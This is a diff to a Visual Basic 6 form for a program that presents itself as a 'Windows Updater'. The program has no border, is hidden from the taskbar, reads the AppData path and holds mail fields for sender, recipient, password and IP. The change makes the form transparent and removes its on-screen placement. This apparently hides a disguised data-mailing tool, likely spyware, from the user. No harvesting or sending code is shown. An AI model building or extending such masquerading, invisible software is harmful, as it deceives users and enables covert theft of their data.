@@ -2,14 +2,14 @@ VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Updater"
-   ClientHeight    =   90
+   ClientHeight    =   2055
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   90
+   ClientWidth     =   3495
    Icon            =   "SendMail.frx":0000
    LinkTopic       =   "Form1"
-   ScaleHeight     =   90
-   ScaleWidth      =   90
+   ScaleHeight     =   2055
+   ScaleWidth      =   3495
    ShowInTaskbar   =   0   'False
    StartUpPosition =   3  'Windows Default
    Begin VB.Timer Timer1 
@@ -68,14 +68,16 @@ Dim MyIP As String
 Public Enum mceIDLPaths
     CSIDL_APPDATA = &H1A 'C:\WINNT\Profiles\username\Application Data.
 End Enum
-Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
 
 Public Lpath, sendTo, sendFrom, FromPWD, FromPC As String
 
 
 Private Sub Form_Load()
-Me.Left = Screen.Width - Me.Width
-Me.Top = Screen.Height - Me.Height
+
+TransparentForm Me
+'Me.Left = Screen.Width - Me.Width
+'Me.Top = Screen.Height - Me.Height
 LoadSetting
 End Sub
 Private Sub LoadSetting()
